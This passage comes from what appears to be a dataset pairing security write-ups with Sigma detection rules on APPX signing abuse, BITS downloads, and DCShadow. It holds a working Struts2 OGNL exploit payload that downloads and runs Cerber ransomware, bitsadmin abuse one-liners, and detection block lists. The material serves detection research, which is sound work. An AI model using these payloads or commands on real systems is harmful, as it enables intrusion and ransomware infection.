00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Suspicious Digital Signature Of AppX Package",
      "id": "b5aa7d60-c17e-4538-97de-09029d6cd76b",
      "status": "test",
      "description": "Detects execution of AppX packages with known suspicious or malicious signature",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-16",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxpackaging-om"
      },
      "detection": {
        "selection": {
          "EventID": 157,
          "subjectName": "CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxpackaging_om\\win_appxpackaging_om_sups_appx_signature.yml",
    "id": "716"
  },
  {
    "url": "https://twitter.com/malmoeb/status/1535142803075960832",
    "markdown": "# Post\n\nJun 10, 2022\n\n8/ 4. example:\n\n```\nStart-BitsTransfer -Source http://X.X.X.X/nc64.exe -Destination 'C:\\tmp\\nc.exe'\n```\n\nAnd we see a different user agent because we used BITS (the Background Intelligent Transfer Service).\n\n```image\nDescription: The image displays a technical output related to the Hypertext Transfer Protocol (HTTP) request for the file '/nc64.exe'. It shows the details of the GET request, which includes the request method, URI, version, connection type, accepted formats, and the user agent identified as 'Microsoft BITS/7.8'. The request is part of a context discussing the use of the Background Intelligent Transfer Service (BITS) to download files.\nTranscription: |\n  Hypertext Transfer Protocol\n  GET /nc64.exe HTTP/1.1\\r\\n\n  [Expert Info (Chat/Sequence): GET /nc64.exe HTTP/1.1\\r\\n]\n  [GET /nc64.exe HTTP/1.1\\r\\n]\n  [Severity level: Chat]\n  [Group: Sequence]\n  Request Method: GET\n  Request URI: /nc64.exe\n  Request Version: HTTP/1.1\n  Connection: Keep-Alive\\r\\n\n  Accept: */*\\r\\n\n  Accept-Encoding: identity\\r\\n\n  Tf-Unmodified-Since: Thu, 09 Jun 2022 07:54:13 GMT\\r\\n\n  User-Agent: Microsoft BITS/7.8\\r\\n\n```\n\n## Comment\n\nJun 10, 2022\n\n9/ Time for a \n@velocidex\n Velociraptor Hunt ;-) \n\nThe Microsoft Windows Bits Client Operational Logs store essential data for a forensic investigation (read more about BITS from \n@Mandiant\n here [1]). \n\nSearch for interesting values inside these event logs with the EvtxHunter Hunt.\n\n```image\nDescription: The image displays a structured data format related to the Windows Event Logs, specifically for the BITS (Background Intelligent Transfer Service) Client. It shows key components such as 'EvtxGlob', which outlines the file path for .evtx logs, 'iocRegex', which appears to contain a regex string (nc64), and sections for 'WhitelistRegex'. This layout is likely part of a tool or application used for forensic investigations and data analysis.\nTranscription: |\n  Artifact\n  Windows.EventLogs.EvtxHunter\n  \n  EvtxGlob\n  %SystemRoot%\\System32\\winevt\\Logs\\Microsoft-Windows-Bits-Client*.evtx\n  \n  iocRegex\n  nc64\n  \n  WhitelistRegex\n```\n\n## Comment\n\nJun 10, 2022\n\n9/ Besides analyzing the user agents (or the lack thereof!), the BITS event logs can also be used very well for hunting. \n\nGood Luck! 🍀\n\n```image\nDescription: The image displays a screenshot of event log data related to the Microsoft Windows Background Intelligent Transfer Service (BITS). It contains a table with various columns such as 'Channel', 'EventID', 'EventRecordID', 'UserSID', 'Username', and 'EventData'. The highlighted section in the 'EventData' shows details of a BITS transfer, including information on the user, job title, job ID, job owner, file count, and specific file paths for remote and local names, indicating a potential file transfer from a remote source.\nTranscription: |\n  Channel: Microsoft-Windows-Bits-Client/Operational\n  EventID: 16403\n  EventRecordID: 2730\n  UserSID: S-1-5-21-4008431687-740994179-4145981840-1000\n  Username: malmoeb\n  EventData: {\n    \"User\" : \"\\malmoeb\",\n    \"jobTitle\" : \"BITS Transfer\",\n    \"jobId\" : \"25B16A68-2A0C-4C2E-A2BD-D36C57E307B4\",\n    \"jobOwner\" : \"\\malmoeb\",\n    \"fileCount\" : 1,\n    \"RemoteName\" : \"http://).44/nc64.exe\",\n    \"LocalName\" : \"C:\\tmp\\nc.exe\",\n    \"processId\" : 12532,\n    \"ClientProcessStartKey\" : \n  }\n```\n\n## Comment\n\nJun 10, 2022\n\n10/\n\nReference:\n\n[1] https://cloud.google.com/blog/topics/threat-intelligence/attacker-use-of-windows-background-intelligent-transfer-service/",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From File Sharing Domains",
      "id": "d635249d-86b5-4dad-a8c7-d7272b788586",
      "status": "experimental",
      "description": "Detects BITS transfer job downloading files from a file sharing domain.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md",
        "https://twitter.com/malmoeb/status/1535142803075960832",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2024-10-21",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_file_sharing_domains.yml",
    "id": "718"
  },
  {
    "url": "https://isc.sans.edu/diary/22264",
    "markdown": "# Internet Storm Center\n\n## Threat Level:\ngreen\n\n---\n\n# Java Struts2 Vulnerability Used To Install Cerber Crypto Ransomware\n\n**Published**: 2017-04-06.\n**Last Updated**: 2017-04-06\n\n1 comment(s)\n\n---\n\nWe do have a special webcast about the Struts2 Vulnerability scheduled for 11am ET today. Sign up here.\n\nSince about a month, we are tracking numerous attempts to exploit the Java Struts2 vulnerability (CVE-2017-5638). Typically, the exploits targeted Unix systems with simple Perl backdoors and bots. But recently, I saw a number of exploit attempts targeting Windows systems using a variant of the Cerber ransomware.\n\n```\n%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='\n<strong>\n<span style=\"color:#c0392b\">\nBITSAdmin.exe /Transfer JOB hxxp://82[.]165[.]129[.]119/UnInstall.exe %TEMP%/UnInstall.exe &amp; %TEMP%/UnInstall.exe\n</span>\n</strong>\n').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n```\n\nThe command executed by the exploit as shown above:\n1. The script uses BITSAdmin to download the malware (I obfuscated the URL above).\n2. The malware (\"UnInstall.exe\") is saved in the %TEMP% directory.\n3. Finally, the malware is executed.\n\nVirustotal shows pretty good coverage for this malware by now:\n\n```image\nAlt: Malware Coverage\nDescription: The image displays a VirusTotal analysis result for a file named 'UnInstall.exe'. It includes the SHA256 hash of the file, the detection ratio indicating that 24 out of 61 antivirus engines flagged the file as malicious, and the analysis date showing it was performed on April 6, 2017, at 01:53:09 UTC. The layout is typical for VirusTotal, featuring a logo at the top and a structured presentation of the analysis data.\nTranscription: |\n  SHA256: c17ee78f87a376086901791ac1b60d0bbe13f78a023882576bec7e00aceffac6\n  File name: UnInstall.exe\n  Detection ratio: 24 / 61\n  Analysis date: 2017-04-06 01:53:09 UTC (0 minutes ago)\n```\n\nThe malware reaches out to btc.blockr.io to retrieve a bitcoin wallet address for the money transfer. Encrypted files are renamed using random (encrypted) file names.\n\n```image\nAlt: Malware Execution\nDescription: The image displays a ransom note from the Cerber ransomware on a Windows 10 interface. The note informs the victim that their files have been encrypted and provides instructions on how to recover them. Key points include: the necessity of obtaining a private key and decryption program, steps to download the Tor Browser, and a link to access a personal recovery page on the dark web. The ransom note is prominently displayed in red text against a grey background, emphasizing the urgency and severity of the situation.\nTranscription: |\n  CERBER RANSOMWARE\n  \n  Instructions\n  \n  YOUR DOCUMENTS, PHOTOS, DATABASES AND OTHER IMPORTANT FILES HAVE BEEN ENCRYPTED!\n  \n  The only way to decrypt your files is to receive the private key and decryption program.\n  \n  To receive the private key and decryption program go to any decrypted folder - inside there is the special file (*_READ_THIS_FILE_* ) with complete instructions how to decrypt your files.\n  \n  If you cannot find any (*_READ_THIS_FILE_* ) file at your PC, follow the instructions below:\n  \n  1. Download \"Tor Browser\" from https://www.torproject.org/ and install it.\n  2. In the \"Tor Browser\" open your personal page here:\n     http://p27d0khpz2n7nvgr.onion/A234-1CF9-1011-0098-7BF3\n     Note! This page is available via \"Tor Browser\" only.\n  \n  Any attempts to recover files without paying will result in permanent data loss!\n```\n\n---\n\n## Comments\n\n[quote]\nThe command executed by the exploit as shown above:\n1. The script uses BITSAdmin to download the malware (I obfuscated the URL above).\n2. The malware (\"UnInstall.exe\") is saved in the %TEMP% directory.\n3. Finally, the malware is executed.\n[/quote]\n\nAs usual, pretty harmless! Only Windows administrators who still have not employed whitelisting (for example using Software Restriction Policies, available in ALL editions of Windows XP and later versions) to deny execution in %USERPROFILE% (and all other locations unprivileged users can write too) put their users at trivially avoidable risk.\n\n**Anonymous**\nApr 6th 2017",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From Direct IP",
      "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
      "related": [
        {
          "id": "99c840f2-2012-46fd-9141-c761987550ef",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a BITS transfer job downloading file(s) from a direct IP address.",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-03-27",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            "http://1",
            "http://2",
            "http://3",
            "http://4",
            "http://5",
            "http://6",
            "http://7",
            "http://8",
            "http://9",
            "https://1",
            "https://2",
            "https://3",
            "https://4",
            "https://5",
            "https://6",
            "https://7",
            "https://8",
            "https://9"
          ]
        },
        "filter_optional_local_networks": {
          "RemoteName|contains": [
            "://10.",
            "://192.168.",
            "://172.16.",
            "://172.17.",
            "://172.18.",
            "://172.19.",
            "://172.20.",
            "://172.21.",
            "://172.22.",
            "://172.23.",
            "://172.24.",
            "://172.25.",
            "://172.26.",
            "://172.27.",
            "://172.28.",
            "://172.29.",
            "://172.30.",
            "://172.31.",
            "://127.",
            "://169.254."
          ]
        },
        "filter_optional_seven_zip": {
          "RemoteName|contains": [
            "https://7-",
            "http://7-"
          ]
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_ip_address.yml",
    "id": "722"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
    "markdown": "# /Bitsadmin.exe\n\n- Alternate data streams\n- Download\n- Copy\n- Execute\n\nUsed for managing background intelligent transfer\n\n## Paths:\n- C:\\Windows\\System32\\bitsadmin.exe\n- C:\\Windows\\SysWOW64\\bitsadmin.exe\n\n## Resources:\n- https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679\n- https://www.youtube.com/watch?v=_8xJaaQlpBo\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n\n## Detections:\n- Sigma: proc_creation_win_bitsadmin_download.yml\n- Sigma: proxy_ua_bitsadmin_susp_tld.yml\n- Sigma: proc_creation_win_bitsadmin_potential_persistence.yml\n- Splunk: bitsadmin_download_file.yml\n- IOC: Child process from bitsadmin.exe\n- IOC: bitsadmin creates new files\n- IOC: bitsadmin adds data to alternate data stream\n\n## Alternate data streams\n### Create a bitsadmin job\n1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.\n   ```\n   bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1\n   ```\n   - **Use case**: Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1564.004: NTFS File Attributes\n\n## Download\n### Create a bitsadmin job\n1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.\n   ```\n   bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1\n   ```\n   - **Use case**: Download file from Internet\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1105: Ingress Tool Transfer\n\n## Copy\n### Command for copying cmd.exe\n1. Command for copying cmd.exe to another folder\n   ```\n   bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset\n   ```\n   - **Use case**: Copy file\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n   - **ATT&CK® technique**: T1105: Ingress Tool Transfer\n\n## Execute\n### Create a bitsadmin job\n1. One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.\n   ```\n   bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset\n   ```\n   - **Use case**: Execute binary file specified. Can be used as a defensive evasion.\n   - **Privileges required**: User\n   - **Operating systems**: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n   - **ATT&CK® technique**: T1218: System Binary Proxy Execution",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From Direct IP",
      "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
      "related": [
        {
          "id": "99c840f2-2012-46fd-9141-c761987550ef",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a BITS transfer job downloading file(s) from a direct IP address.",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-03-27",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            "http://1",
            "http://2",
            "http://3",
            "http://4",
            "http://5",
            "http://6",
            "http://7",
            "http://8",
            "http://9",
            "https://1",
            "https://2",
            "https://3",
            "https://4",
            "https://5",
            "https://6",
            "https://7",
            "https://8",
            "https://9"
          ]
        },
        "filter_optional_local_networks": {
          "RemoteName|contains": [
            "://10.",
            "://192.168.",
            "://172.16.",
            "://172.17.",
            "://172.18.",
            "://172.19.",
            "://172.20.",
            "://172.21.",
            "://172.22.",
            "://172.23.",
            "://172.24.",
            "://172.25.",
            "://172.26.",
            "://172.27.",
            "://172.28.",
            "://172.29.",
            "://172.30.",
            "://172.31.",
            "://127.",
            "://169.254."
          ]
        },
        "filter_optional_seven_zip": {
          "RemoteName|contains": [
            "https://7-",
            "http://7-"
          ]
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_ip_address.yml",
    "id": "723"
  },
  {
    "url": "https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2",
    "markdown": "# dcsync-dcshadow.splunk\n\n```\nsourcetype=XmlWinEventLog:Security AND EventCode=4662 AND NOT (SubjectUserSid=\"AUTORITE NT\\\\*\" OR SubjectDomainName=\"Window Manager\")\n(\n  (ObjectType=\"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}\" OR ObjectType=\"domainDNS\")\n  AND\n  (Properties=\"*Replicating Directory Changes All*\" OR Properties=\"*{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}*\" OR Properties = \"*{9923a32a-3607-11d2-b9be-0000f87a36b2}*\" OR Properties = \"*{1131f6ac-9c07-11d1-f79f-00c04fc2dcd2}*\")    \n)\n| rename _time AS DSTime, SubjectUserSid AS DSUserSid, SubjectDomainName AS DSDomainName, SubjectUserName AS DSUserName, SubjectLogonId AS DSLogonId, ObjectType AS DSObjectType, ObjectName AS DSObjectName, Properties AS DSProperties status AS DSStatus\n| join type=left Computer, DSLogonId\n[\n    search sourcetype=XmlWinEventLog:Security AND EventCode=4624 NOT (TargetUserSid=\"AUTORITE NT\\\\*\" OR TargetDomainName=\"Window Manager\")\n    | rename _time AS LogonTime, TargetLogonId AS DSLogonId\n]\n| convert timeformat=\"%d/%m/%Y %H:%M:%S\" ctime(DSTime), ctime(LogonTime)\n| table DSTime, Computer, DSUserSid, DSDomainName, DSUserName, DSObjectType, DSObjectName, DSProperties, DSStatus, DSLogonId, LogonTime, AuthenticationPackageName, IpAddress, IpPort\n\nsourcetype=\"XmlWinEventLog:Security\" AND EventCode=4742 AND NOT (SubjectUserSid=\"AUTORITE NT\\\\*\" OR SubjectDomainName=\"Window Manager\")\nAND (ServicePrincipalNames=\"*GC/*\" OR ServicePrincipalNames=\"*E3514235-4B06-11D1-AB04-00C04FC2DCD2/*\")\nAND NOT (SubjectUserSid = \"AUTORITE NT\\\\*\")\n| rename _time AS CAMTime, SubjectUserSid AS CAMSubjectUserSid, SubjectDomainName AS CAMSubjectDomainName, SubjectUserName AS CAMSubjectUserName, SubjectLogonId AS CAMSubjectLogonId, TargetSid AS CAMTargetSid, TargetDomainName AS CAMTargetDomainName, TargetUserName AS CAMTargetUserName, ServicePrincipalNames AS CAMServicePrincipalNames\n| join type=left Computer, CAMSubjectLogonId\n[\n    search sourcetype=XmlWinEventLog:Security AND EventCode=4624 NOT (TargetUserSid=\"AUTORITE NT\\\\*\" OR TargetDomainName=\"Window Manager\")\n    | rename _time AS LogonTime, TargetLogonId AS CAMSubjectLogonId\n]\n| convert timeformat=\"%d/%m/%Y %H:%M:%S\" ctime(CAMTime), ctime(LogonTime)\n| table CAMTime, CAMSubjectUserSid, CAMSubjectDomainName, CAMSubjectUserName, CAMTargetSid, CAMTargetDomainName, CAMTargetUserName, CAMServicePrincipalNames, CAMSubjectLogonId, LogonTime, AuthenticationPackageName, IpAddress, IpPort\n```\n\n## Comment\n\nBe aware that you might have to change AUTORITE NT and filter out DC$ accounts and others particularities\n\"join\" is limited by the product and does not work as expected in SQL\n\n## Comment\n\nThe use of 4662 events has two prerequisites:\n1. The logging hosts (All DCs, in this case) must have the following set in its auditing config: DS Access -> Audit Directory Service Access: Success and Failure\n2. The AD objects to be monitored (Which, I'm sorry, but I'm unclear exactly which objects must have this ACL applied) must have an Audit ACL applied. Further Question: Do these ACLs need to log all read or write access by anyone at all, or do we just care about write access, or possibly just from a restricted set of users?\n\nPlease add a description of the exact configuration required to enable the necessary logging.",
    "sigma_rule": {
      "title": "Possible DC Shadow Attack",
      "id": "32e19d25-4aed-4860-a55a-be99cb0bf7ed",
      "related": [
        {
          "id": "611eab06-a145-4dfa-a295-3ccc5c20f59a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects DCShadow via create new SPN",
      "references": [
        "https://twitter.com/gentilkiwi/status/1003236624925413376",
        "https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2",
        "https://web.archive.org/web/20180203014709/https://blog.alsid.eu/dcshadow-explained-4510f52fc19d?gi=c426ac876c48"
      ],
      "author": "Ilyas Ochkov, oscd.community, Chakib Gzenayi (@Chak092), Hosni Mribah",
      "date": "2019-10-25",
      "modified": "2022-10-17",
      "tags": [
        "attack.credential-access",
        "attack.t1207"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The \"Audit Directory Service Changes\" logging policy must be configured in order to receive events. Audit events are generated only for objects with configured system access control lists (SACLs). Audit events are generated only for objects with configured system access control lists (SACLs) and only when accessed in a manner that matches their SACL settings. This policy covers the following events ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)"
      },
      "detection": {
        "selection1": {
          "EventID": 4742,
          "ServicePrincipalNames|contains": "GC/"
        },
        "selection2": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "servicePrincipalName",
          "AttributeValue|startswith": "GC/"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Valid on domain controllers; exclude known DCs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_possible_dc_shadow.yml",
    "id": "772"
  },
  {
    "url": "https://adsecurity.org/?p=1772",
